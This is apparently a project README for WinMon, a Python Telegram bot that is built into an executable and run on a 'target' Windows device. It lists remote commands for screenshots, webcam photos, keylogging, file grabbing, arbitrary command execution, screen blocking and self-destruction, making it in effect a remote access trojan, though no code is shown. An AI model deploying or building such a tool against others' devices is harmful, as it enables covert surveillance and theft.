# WinMon - Windows Monitoring Tool

WinMon is a Python-based Telegram bot designed for remote monitoring and control of Windows devices. It allows users to execute various commands remotely through Telegram, such as capturing screenshots, accessing the webcam, controlling volume, sending alerts, and more.

## Installation

1. Clone the repository to your local machine:

```bash
   git clone https://github.com/PavanMeka09/WinMon.git
```
2. Replace the placeholder values in the script:

- `TOKEN`: Replace with your Telegram Bot API token.
- `user_id`: Replace with your Telegram user ID.

3. Make a standalone executable with name `WinMon.exe` using Pyinstaller or auto-py-to-exe.


## Usage

1. Execute `WinMon.exe` in target device.

2. Start a conversation with the bot in Telegram using the provided token.

3. Send commands to the bot to perform various actions on the target Windows device.

## Commands

- `/start`: Initiates the bot and provides device information.
- `/help`: Displays a list of available commands.
- `/alert {message}`: Displays an alert message on the target device.
- `/blockscreen`: Blocks the screen of the target device until rebooted.
- `/ss`: Captures a screenshot of the target device's screen.
- `/webcam`: Accesses the webcam of the target device and sends a photo.
- `/tts {message}`: Converts text to speech and plays it on the target device.
- `/maxvol`: Increases the volume continuously.
- `/minvol`: Decreases the volume continuously.
- `/grab {location}`: Grabs a file from the specified location on the target device.
- `/keylog`: Starts logging keys pressed on the target device.
- `/cmd {command}`: Executes a command on the target device.
- `/cd {path}`: Changes the current directory on the target device.
- `/reboot`: Restarts the bot.
- `/restart`: Restarts the target device.
- `/shutdown`: Shuts down the target device.
- `/exit`: Stops the bot.
- `/implode`: Initiates self-destruction of the bot on the target device.

## Security Considerations

- Ensure that the bot token and user ID are kept secure to prevent unauthorized access.
- Use the bot responsibly and only on devices where you have permission to execute commands.